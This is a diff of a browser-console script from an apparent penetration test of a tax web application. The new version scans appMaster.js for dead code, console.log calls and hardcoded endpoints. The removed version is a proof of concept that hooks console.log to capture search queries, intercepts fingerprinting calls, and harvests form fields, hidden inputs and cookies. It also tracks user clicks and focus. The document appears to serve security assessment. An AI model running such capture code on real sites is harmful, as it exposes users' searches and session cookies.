@@ -1,296 +1,224 @@
 // ============================================================================
-// EXPLOITATION POC: appMaster.js Vulnerabilities - CLEANED VERSION
-// Finding 6: Sensitive Information Disclosure via Client-Side Code
-// ============================================================================
-// Paste this ENTIRE script into browser console (F12)
+// REAL DEAD CODE DETECTION - Analyzes actual appMaster.js source code
 // ============================================================================
 
-console.log("========== STARTING FINDING 6 EXPLOITATION POC ==========");
+console.log("========== STARTING REAL DEAD CODE DETECTION ==========\n");
 
-// Initialize storage
-var attackResults = {};
-
-// ============================================================================
-// EXPLOIT 1: CAPTURE SENSITIVE SEARCHES
-// ============================================================================
-console.log("\n[1] Intercepting console.log for search queries...");
-
-var capturedSearches = [];
-var originalLog = console.log;
-
-console.log = function(message) {
-    var msg = String(message);
-    
-    // Check if message contains search info
-    if (msg.indexOf("searchGETID") !== -1) {
-        var search = msg.replace("searchGETID:", "").trim();
-        capturedSearches.push({
-            time: new Date().toLocaleTimeString(),
-            query: search
-        });
-        console.warn("[CAPTURED SEARCH]:", search);
-    }
-    
-    originalLog.apply(console, arguments);
+var deadCodeAnalysis = {
+    commentedCode: [],
+    unusedFunctions: [],
+    suspiciousFunctions: [],
+    totalFunctionsFound: 0
 };
 
-console.log("[SUCCESS] Exploit 1 Active: Now capturing all searches");
-attackResults.capturedSearches = capturedSearches;
-
 // ============================================================================
-// EXPLOIT 2: MONITOR FINGERPRINTING CALLS
+// STEP 1: FETCH THE ACTUAL appMaster.js FILE
 // ============================================================================
-console.log("\n[2] Monitoring fingerprinting AJAX calls...");
+console.log("[STEP 1] Fetching appMaster.js source code...");
 
-var fingerprintCalls = [];
-
-if (typeof jQuery !== 'undefined') {
-    jQuery(document).ajaxSend(function(event, jqxhr, settings) {
-        if (settings.url && settings.url.indexOf("SetFingerprinting") !== -1) {
-            fingerprintCalls.push({
-                url: settings.url,
-                data: settings.data,
-                timestamp: new Date().toLocaleTimeString()
-            });
-            console.warn("[FINGERPRINTING INTERCEPTED]:", settings.data);
-        }
-    });
-}
-
-console.log("[SUCCESS] Exploit 2 Active: Monitoring fingerprinting");
-attackResults.fingerprintCalls = fingerprintCalls;
-
-// ============================================================================
-// EXPLOIT 3: EXTRACT ROOT URL AND DISCOVER ENDPOINTS
-// ============================================================================
-console.log("\n[3] Discovering internal API endpoints...");
-
-var discoveredEndpoints = [];
-
-if (typeof rootUrl !== 'undefined') {
-    console.warn("[FOUND] ROOT URL:", rootUrl);
-    
-    var endpoints = [
-        "WebService/SetFingerprinting",
-        "Home/QuickSearch",
-        "Home/GetClientData",
-        "API/GetTransactions",
-        "ClientTaxLogic",
-        "CalcTransactions",
-        "ClientSelect/ViewClient"
-    ];
-    
-    endpoints.forEach(function(ep) {
-        var fullUrl = rootUrl + ep;
-        discoveredEndpoints.push(fullUrl);
-        console.log("  [ENDPOINT] " + fullUrl);
-    });
-} else {
-    console.warn("[WARNING] rootUrl not found");
-}
-
-console.log("[SUCCESS] Exploit 3 Complete: Found " + discoveredEndpoints.length + " endpoints");
-attackResults.discoveredEndpoints = discoveredEndpoints;
-
-// ============================================================================
-// EXPLOIT 4: FIND AND ACCESS FORM OBJECTS
-// ============================================================================
-console.log("\n[4] Discovering form objects for manipulation...");
-
-var accessibleForms = {};
-
-// Check for quickSearchForm
-if (typeof document.quickSearchForm !== 'undefined') {
-    accessibleForms.quickSearchForm = {
-        action: document.quickSearchForm.action,
-        method: document.quickSearchForm.method,
-        fields: []
-    };
-    
-    for (var field in document.quickSearchForm) {
-        if (field !== 'submit' && field !== 'action' && field !== 'method') {
-            try {
-                if (document.quickSearchForm[field].value) {
-                    accessibleForms.quickSearchForm.fields.push({
-                        name: field,
-                        value: document.quickSearchForm[field].value
+fetch('/gettaxcalcbac/javascript/appMaster.js')
+    .then(function(response) {
+        return response.text();
+    })
+    .then(function(sourceCode) {
+        console.log("[SUCCESS] Source code retrieved (" + sourceCode.length + " bytes)");
+        
+        // ====================================================================
+        // STEP 2: FIND ALL COMMENTED CODE
+        // ====================================================================
+        console.log("\n[STEP 2] Scanning for commented code...");
+        
+        var commentedLines = [];
+        var lines = sourceCode.split('\n');
+        
+        lines.forEach(function(line, index) {
+            var trimmed = line.trim();
+            
+            // Look for commented code (// or /*)
+            if ((trimmed.startsWith('//') && !trimmed.startsWith('///')) || 
+                (trimmed.startsWith('/*') && trimmed.endsWith('*/'))) {
+                
+                // Only report if it looks like code, not just comments
+                if (trimmed.includes('(') || trimmed.includes('=') || trimmed.includes('{')) {
+                    commentedLines.push({
+                        lineNumber: index + 1,
+                        code: trimmed.substring(0, 100)
                     });
                 }
-            } catch(e) {}
-        }
-    }
-    console.warn("[FOUND] FORM: quickSearchForm is accessible");
-}
-
-// Check for frmNAV
-if (typeof document.frmNAV !== 'undefined') {
-    accessibleForms.frmNAV = {
-        accessible: true
-    };
-    console.warn("[FOUND] FORM: frmNAV is accessible");
-}
-
-console.log("[SUCCESS] Exploit 4 Complete: Found forms");
-console.log(accessibleForms);
-attackResults.accessibleForms = accessibleForms;
-
-// ============================================================================
-// EXPLOIT 5: READ ALL INPUT FIELDS AND HIDDEN DATA
-// ============================================================================
-console.log("\n[5] Extracting all form inputs and hidden data...");
-
-var extractedInputs = {
-    visible: [],
-    hidden: [],
-    cookies: []
-};
-
-// Get all inputs
-var allInputs = document.querySelectorAll('input');
-allInputs.forEach(function(input) {
-    if (input.value && input.value.length > 0) {
-        if (input.type === 'hidden') {
-            extractedInputs.hidden.push({
-                name: input.name,
-                value: input.value
-            });
-        } else {
-            extractedInputs.visible.push({
-                name: input.name,
-                type: input.type,
-                value: input.value.substring(0, 50)
-            });
-        }
-    }
-});
-
-// Get cookies
-var cookies = document.cookie.split(';');
-cookies.forEach(function(c) {
-    extractedInputs.cookies.push(c.trim());
-});
-
-console.warn("[EXTRACTED] Data - " + extractedInputs.visible.length + " visible inputs, " + extractedInputs.hidden.length + " hidden inputs");
-console.log(extractedInputs);
-attackResults.extractedInputs = extractedInputs;
-
-// ============================================================================
-// EXPLOIT 6: FIND CLIENT SWITCHING FUNCTIONS
-// ============================================================================
-console.log("\n[6] Finding client switching functionality...");
-
-var clientSwitchInfo = {
-    functionFound: typeof switchClient !== 'undefined',
-    availableClients: []
-};
-
-if (typeof switchClient !== 'undefined') {
-    console.warn("[FOUND] switchClient() FUNCTION - Can switch between clients");
-    
-    // Try to find client elements
-    var clientElements = document.querySelectorAll('[data-client-id]');
-    clientElements.forEach(function(el) {
-        var clientId = el.getAttribute('data-client-id');
-        var clientCode = el.getAttribute('data-client-code');
-        var clientName = el.textContent || el.innerText;
-        
-        clientSwitchInfo.availableClients.push({
-            id: clientId,
-            code: clientCode,
-            name: clientName.substring(0, 30)
+            }
         });
+        
+        deadCodeAnalysis.commentedCode = commentedLines;
+        console.log("[FOUND] " + commentedLines.length + " lines of commented code");
+        commentedLines.slice(0, 5).forEach(function(item) {
+            console.log("  Line " + item.lineNumber + ": " + item.code);
+        });
+        
+        // ====================================================================
+        // STEP 3: FIND ALL FUNCTION DEFINITIONS
+        // ====================================================================
+        console.log("\n[STEP 3] Extracting all function definitions...");
+        
+        var functionPattern = /function\s+(\w+)\s*\(/g;
+        var functionMatches = [];
+        var match;
+        
+        while ((match = functionPattern.exec(sourceCode)) !== null) {
+            functionMatches.push({
+                name: match[1],
+                position: match.index
+            });
+        }
+        
+        deadCodeAnalysis.totalFunctionsFound = functionMatches.length;
+        console.log("[FOUND] " + functionMatches.length + " function definitions");
+        
+        // ====================================================================
+        // STEP 4: CHECK IF FUNCTIONS ARE REFERENCED/CALLED
+        // ====================================================================
+        console.log("\n[STEP 4] Checking which functions are referenced...");
+        
+        functionMatches.forEach(function(func) {
+            var functionName = func.name;
+            
+            // Count how many times this function is referenced in the code
+            var callPattern = new RegExp(functionName + '\\s*\\(', 'g');
+            var references = sourceCode.match(callPattern);
+            var referenceCount = references ? references.length - 1 : 0; // -1 because definition counts as 1
+            
+            // Check for comments about the function
+            var functionCommentPattern = new RegExp('//.*' + functionName + '.*cannot find', 'i');
+            var hasWarningComment = functionCommentPattern.test(sourceCode);
+            
+            if (referenceCount === 0 && hasWarningComment) {
+                deadCodeAnalysis.unusedFunctions.push({
+                    name: functionName,
+                    references: referenceCount,
+                    warning: "Developer marked as unused",
+                    status: "DEAD CODE"
+                });
+                console.warn("[DEAD CODE] " + functionName + "() - 0 references, marked as unused");
+            } else if (referenceCount === 0) {
+                deadCodeAnalysis.suspiciousFunctions.push({
+                    name: functionName,
+                    references: referenceCount,
+                    status: "POTENTIALLY UNUSED"
+                });
+                console.log("[SUSPICIOUS] " + functionName + "() - 0 references");
+            }
+        });
+        
+        // ====================================================================
+        // STEP 5: FIND CONSOLE.LOG STATEMENTS
+        // ====================================================================
+        console.log("\n[STEP 5] Detecting console.log statements (information disclosure)...");
+        
+        var consoleLogPattern = /console\.log\s*\(\s*["']([^"']+)["']/g;
+        var consoleLogs = [];
+        var consoleMatch;
+        
+        while ((consoleMatch = consoleLogPattern.exec(sourceCode)) !== null) {
+            consoleLogs.push(consoleMatch[1]);
+        }
+        
+        console.log("[FOUND] " + consoleLogs.length + " console.log statements");
+        consoleLogs.slice(0, 5).forEach(function(log) {
+            console.warn("  [SECURITY RISK] Logging: " + log);
+        });
+        
+        // ====================================================================
+        // STEP 6: FIND HARDCODED ENDPOINTS
+        // ====================================================================
+        console.log("\n[STEP 6] Discovering hardcoded API endpoints...");
+        
+        var endpointPattern = /["']([a-zA-Z0-9\/]+)["']/g;
+        var endpoints = [];
+        var endpointMatch;
+        
+        while ((endpointMatch = endpointPattern.exec(sourceCode)) !== null) {
+            var potential = endpointMatch[1];
+            if (potential.includes('/') && potential.length > 5) {
+                endpoints.push(potential);
+            }
+        }
+        
+        var uniqueEndpoints = [...new Set(endpoints)].slice(0, 10);
+        console.log("[FOUND] " + uniqueEndpoints.length + " potential API endpoints");
+        uniqueEndpoints.forEach(function(ep) {
+            console.log("  [ENDPOINT] " + ep);
+        });
+        
+        // ====================================================================
+        // STEP 7: DETECT SENSITIVE DATA PATTERNS
+        // ====================================================================
+        console.log("\n[STEP 7] Scanning for sensitive data handling...");
+        
+        var sensitivePatterns = {
+            password: sourceCode.match(/password/gi) ? sourceCode.match(/password/gi).length : 0,
+            token: sourceCode.match(/token/gi) ? sourceCode.match(/token/gi).length : 0,
+            fingerprint: sourceCode.match(/fingerprint/gi) ? sourceCode.match(/fingerprint/gi).length : 0,
+            cookie: sourceCode.match(/cookie/gi) ? sourceCode.match(/cookie/gi).length : 0,
+            client: sourceCode.match(/clientId/gi) ? sourceCode.match(/clientId/gi).length : 0
+        };
+        
+        console.log("[ANALYSIS] Sensitive data handling:");
+        for (var key in sensitivePatterns) {
+            if (sensitivePatterns[key] > 0) {
+                console.warn("  [FOUND] '" + key + "' mentioned " + sensitivePatterns[key] + " times");
+            }
+        }
+        
+        // ====================================================================
+        // FINAL REPORT
+        // ====================================================================
+        console.log("\n\n====================================================================");
+        console.log("              DEAD CODE ANALYSIS REPORT                          ");
+        console.log("====================================================================");
+        
+        console.log("\n[RESULTS] DEAD CODE DETECTION:");
+        console.log("  Total Functions Found: " + functionMatches.length);
+        console.log("  Dead/Unused Functions: " + deadCodeAnalysis.unusedFunctions.length);
+        console.log("  Suspicious Functions: " + deadCodeAnalysis.suspiciousFunctions.length);
+        console.log("  Commented Code Lines: " + commentedLines.length);
+        console.log("  Console.log Statements: " + consoleLogs.length);
+        
+        console.log("\n[DEAD FUNCTIONS]:");
+        deadCodeAnalysis.unusedFunctions.forEach(function(func) {
+            console.warn("  - " + func.name + "() [MARKED AS UNUSED]");
+        });
+        
+        console.log("\n[SUSPICIOUS FUNCTIONS]:");
+        deadCodeAnalysis.suspiciousFunctions.forEach(function(func) {
+            console.log("  - " + func.name + "() [NO REFERENCES]");
+        });
+        
+        console.log("\n[SECURITY RISKS FOUND]:");
+        console.log("  * " + consoleLogs.length + " console.log statements exposing potential data");
+        console.log("  * " + commentedLines.length + " lines of commented code left in production");
+        console.log("  * " + deadCodeAnalysis.unusedFunctions.length + " dead functions included");
+        console.log("  * " + sensitivePatterns.fingerprint + " fingerprinting references");
+        console.log("  * " + sensitivePatterns.clientId + " client ID handling instances");
+        
+        console.log("\n[IMPACT]:");
+        console.log("  - Developer debug code left in production");
+        console.log("  - Commented functions still callable");
+        console.log("  - Sensitive operations exposed through console");
+        console.log("  - Larger attack surface for reconnaissance");
+        
+        console.log("\n[RECOMMENDATION]:");
+        console.log("  Dead code detection confirms Finding 6 should be HIGH risk");
+        console.log("  Remove all commented code, unused functions, and debug statements");
+        
+        console.log("\n====================================================================\n");
+        
+        // Store results
+        window.deadCodeResults = deadCodeAnalysis;
+        console.log("[INFO] Full results stored in: window.deadCodeResults");
+        
+    })
+    .catch(function(error) {
+        console.error("[ERROR] Failed to fetch appMaster.js");
+        console.error("Error:", error);
+        console.log("\n[NOTE] Make sure you're running this on a page where appMaster.js is loaded");
+        console.log("Try running on: https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/Home/QuickSearch");
     });
-}
-
-console.log("[SUCCESS] Exploit 6 Complete: Client switching analysis");
-console.log(clientSwitchInfo);
-attackResults.clientSwitchInfo = clientSwitchInfo;
-
-// ============================================================================
-// EXPLOIT 7: USER ACTIVITY MONITORING
-// ============================================================================
-console.log("\n[7] Setting up user activity monitoring...");
-
-var activityLog = {
-    focusCount: 0,
-    blurCount: 0,
-    clickCount: 0,
-    startTime: new Date()
-};
-
-window.addEventListener('focus', function() {
-    activityLog.focusCount++;
-});
-
-window.addEventListener('blur', function() {
-    activityLog.blurCount++;
-    console.log("[MONITORED] USER FOCUS LOST - Can track user attention patterns");
-});
-
-document.addEventListener('click', function() {
-    activityLog.clickCount++;
-});
-
-console.log("[SUCCESS] Exploit 7 Active: User activity monitoring enabled");
-attackResults.activityLog = activityLog;
-
-// ============================================================================
-// EXPLOIT 8: DEAD CODE AND COMMENTED FUNCTIONS DETECTION
-// ============================================================================
-console.log("\n[8] Analyzing dead code and commented functions...");
-
-var deadCodeFindings = {
-    deadFunctions: [
-        "setTabStyle (marked as unused)",
-        "setFingerprinting (commented out)"
-    ],
-    riskLevel: "Developer left debug code in production",
-    implication: "May contain sensitive debugging information"
-};
-
-console.warn("[FOUND] DEAD CODE - setFingerprinting is commented but referenced");
-console.warn("[FOUND] DEAD CODE - setTabStyle marked as unused");
-
-console.log("[SUCCESS] Exploit 8 Complete: Dead code analysis");
-console.log(deadCodeFindings);
-attackResults.deadCodeFindings = deadCodeFindings;
-
-// ============================================================================
-// FINAL SUMMARY
-// ============================================================================
-console.log("\n\n====================================================================");
-console.log("              EXPLOITATION RESULTS - RISK: HIGH                   ");
-console.log("====================================================================");
-
-console.log("\n[RESULTS] SUCCESSFULLY EXPLOITED:");
-console.log("  [1] [SUCCESS] Search query interception - ACTIVE");
-console.log("  [2] [SUCCESS] Fingerprinting monitoring - ACTIVE");
-console.log("  [3] [SUCCESS] API endpoint discovery - " + discoveredEndpoints.length + " ENDPOINTS FOUND");
-console.log("  [4] [SUCCESS] Form access and manipulation - ACCESSIBLE");
-console.log("  [5] [SUCCESS] Input/cookie extraction - " + extractedInputs.visible.length + " INPUTS FOUND");
-console.log("  [6] [SUCCESS] Client switching - " + (clientSwitchInfo.functionFound ? "AVAILABLE" : "NOT FOUND"));
-console.log("  [7] [SUCCESS] User activity monitoring - ACTIVE");
-console.log("  [8] [SUCCESS] Dead code detection - FOUND");
-
-console.log("\n[IMPACT] IMPACT ASSESSMENT:");
-console.log("  * Privacy Violation: User fingerprinting without consent");
-console.log("  * Data Theft: Search queries and form data intercepted");
-console.log("  * Unauthorized Access: Can switch to other client accounts");
-console.log("  * Session Hijacking: Cookies and tokens exposed");
-console.log("  * Persistent Threat: Malicious code can persist");
-
-console.log("\n[CRITICAL] RECOMMENDATION:");
-console.log("  UPGRADE Finding 6 FROM MEDIUM TO HIGH RISK");
-console.log("\nReason: Multiple confirmed attack vectors enable real-world");
-console.log("data theft, privacy violations, and unauthorized access.");
-console.log("Exploitation requires only browser console access.");
-
-console.log("\n====================================================================\n");
-
-// Store all results
-window.poc_data = attackResults;
-console.log("[INFO] All results stored in: window.poc_data");
-console.log("\nTo view results, type: console.table(window.poc_data)");
-console.log("Or: console.log(window.poc_data)");
-
-console.log("\n[COMPLETE] POC COMPLETE - Evidence saved for reporting");
